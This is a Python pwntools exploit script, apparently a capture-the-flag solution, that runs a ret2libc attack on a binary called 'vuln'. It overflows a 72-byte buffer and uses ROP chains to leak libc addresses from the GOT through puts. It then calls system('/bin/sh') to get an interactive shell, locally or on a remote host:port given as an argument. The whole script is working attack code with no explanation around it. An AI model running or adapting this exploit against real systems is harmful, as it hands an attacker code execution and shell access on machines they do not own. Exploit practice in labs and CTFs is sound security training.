from pwn import *
import sys

context.binary = "./vuln"

elf = ELF("./vuln")

# libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc = ELF("./libc.so.6")

rop = ROP(elf)



def get_process():
    if len(sys.argv) == 1:
        return context.binary.process()
    elif len(sys.argv) == 2:
        addr, port = sys.argv[1].split(":")

        port = int(port)

        return remote(addr, port)
    
def leak(p, function):

    payload = b'A' * 72

    payload += p64(rop.rdi[0])

    payload += p64(elf.got[function])

    payload += p64(elf.plt.puts)

    payload += p64(elf.sym.vuln)

    p.sendlineafter(b'payload: ', payload)

    p.recvline()
    p.recvline()
    
    address = u64(p.recvline().strip().ljust(8, b'\x00'))

    return address

def get_shell(p):

    payload = b'A' * 72

    payload += p64(rop.ret[0])

    payload += p64(rop.rdi[0])

    payload += p64(next(libc.search(b'/bin/sh')))

    payload += p64(libc.sym.system)

    p.sendlineafter(b'payload: ', payload)

def main():
    p = get_process()

    p.sendlineafter(b'(1, 2, or 3): ', b'2')

    p.sendlineafter(b'(1, 2, or 3): ', b'1')

    system_address = leak(p, 'system')

    log.info(f"Leaked system address: {hex(system_address)}")

    puts_address = leak(p, 'puts')

    log.info(f"Leaked puts address: {hex(puts_address)}")

    gets_address = leak(p, 'gets')

    log.info(f"Leaked gets address: {hex(gets_address)}")

    setbuf_address = leak(p, 'setbuf')

    log.info(f"Leaked setbuf address: {hex(setbuf_address)}")

    libc.address = system_address - libc.sym.system

    log.success(f"Leaded libc base address: {hex(libc.address)}")

    get_shell(p)

    p.interactive()

if __name__ == "__main__":
    main()